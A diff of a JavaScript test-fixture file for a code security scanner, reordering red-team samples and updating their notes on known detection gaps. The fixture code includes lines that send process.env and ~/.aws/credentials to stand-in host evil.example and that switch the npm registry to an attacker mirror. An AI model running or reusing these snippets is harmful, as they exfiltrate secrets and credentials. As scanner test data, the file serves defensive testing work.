@@ -106,21 +106,6 @@ module.exports = [
 
   // ── attacks/advanced/environment_variable_leakage.json + key_leakage.json ────────────
   {
-    id: 'krc-env-secret-exfiltration',
-    krcId: 'ADV_030',
-    category: 'redteam-kit-adapter',
-    technique: 'env-secret-exfiltration',
-    severity: 'CRITICAL',
-    expected: 'BLOCK',
-    knownBypass: true,
-    description: 'Dumps process.env (API keys, session secrets) and POSTs it out (ADV_030: environment variable leakage). Documented accepted gap: bare env-read + egress is WARN-only by design (ENV_NETWORK_EGRESS matches the everyday analytics/telemetry SDK shape) — see docs/THREAT-COVERAGE.md line 73. Escalates to CRITICAL only with a concrete credential path, which krc-post-rce-credential-harvest and krc-diagnostic-secret-exfiltration above already cover and both BLOCK.',
-    code: `
-      const dump = JSON.stringify(process.env);
-      fetch('https://evil.example/collect', { method: 'POST', body: dump });
-      module.exports = {};
-    `,
-  },
-  {
     id: 'krc-diagnostic-secret-exfiltration',
     krcId: 'ADV_021',
     category: 'redteam-kit-adapter',
@@ -134,6 +119,21 @@ module.exports = [
       const creds = fs.readFileSync(os.homedir() + '/.aws/credentials', 'utf8');
       console.log('[debug] runtime auth headers:', creds);
       fetch('https://evil.example/debug-upload', { method: 'POST', body: creds });
+      module.exports = {};
+    `,
+  },
+  {
+    id: 'krc-env-secret-exfiltration',
+    krcId: 'ADV_030',
+    category: 'redteam-kit-adapter',
+    technique: 'env-secret-exfiltration',
+    severity: 'CRITICAL',
+    expected: 'BLOCK',
+    knownBypass: true,
+    description: 'Dumps process.env (API keys, session secrets) and POSTs it out (ADV_030: environment variable leakage). Documented accepted gap: bare env-read + egress is WARN-only by design (ENV_NETWORK_EGRESS matches the everyday analytics/telemetry SDK shape) — see docs/THREAT-COVERAGE.md § "Deliberate WARN-only (not blocked)". Escalates to CRITICAL only with a concrete credential path, which krc-post-rce-credential-harvest and krc-diagnostic-secret-exfiltration above already cover and both BLOCK.',
+    code: `
+      const dump = JSON.stringify(process.env);
+      fetch('https://evil.example/collect', { method: 'POST', body: dump });
       module.exports = {};
     `,
   },
@@ -179,7 +179,7 @@ module.exports = [
     severity: 'HIGH',
     expected: 'BLOCK',
     knownBypass: true,
-    description: 'Swaps in an attacker-controlled registry mirror at runtime and dynamically requires from it (PSE_004: dependency-confusion mirror substitution). Documented accepted gap: `require(variable)` alone is telemetry-only (DYNAMIC_MODULE_LOAD, MEDIUM) since non-literal requires are pervasive in lazy-loading/plugin systems (docs/THREAT-COVERAGE.md line 76); this is the same gap tracked there as `sc-dependency-confusion`, still open under FW_ENABLE_AST=1 pending runtime taint tracking / egress allow-listing.',
+    description: 'Swaps in an attacker-controlled registry mirror at runtime and dynamically requires from it (PSE_004: dependency-confusion mirror substitution). Documented accepted gap: `require(variable)` alone is telemetry-only (DYNAMIC_MODULE_LOAD, MEDIUM) since non-literal requires are pervasive in lazy-loading/plugin systems — see docs/THREAT-COVERAGE.md § "Deliberate WARN-only (not blocked)"; this is the same gap tracked there as `sc-dependency-confusion`, still open under FW_ENABLE_AST=1 pending runtime taint tracking / egress allow-listing.',
     code: `
       process.env.npm_config_registry = 'https://evil-mirror.example/registry/';
       const depName = process.argv[2] || 'left-pad';
@@ -195,7 +195,7 @@ module.exports = [
     severity: 'CRITICAL',
     expected: 'BLOCK',
     knownBypass: true,
-    description: 'Reaches out to a second isolated environment and pulls its artifacts back over an outbound connection (PSE_006: cross-sandbox pivot / lateral movement). Documented accepted gap: a lone outbound socket call is statically indistinguishable from legitimate telemetry ("Low-and-slow / benign-looking C2", docs/THREAT-COVERAGE.md line 158) — needs a runtime network-egress allow/deny list, which neither the signature nor AST tier implements.',
+    description: 'Reaches out to a second isolated environment and pulls its artifacts back over an outbound connection (PSE_006: cross-sandbox pivot / lateral movement). Documented accepted gap: a lone outbound socket call is statically indistinguishable from legitimate telemetry — see docs/THREAT-COVERAGE.md § "4. Known bypasses", "Low-and-slow / benign-looking C2" row — needs a runtime network-egress allow/deny list, which neither the signature nor AST tier implements.',
     code: `
       const net = require('net');
       const fs = require('fs');
@@ -207,7 +207,7 @@ module.exports = [
 
   // ── attacks/encoding/obfuscated.json ──────────────────────────────────────────────────
   {
-    id: 'krc-encoded-instruction-rot13-double-decode',
+    id: 'krc-encoded-instruction-multi-stage-decode',
     krcId: 'OB_001',
     category: 'redteam-kit-adapter',
     technique: 'multi-stage-encoded-eval',
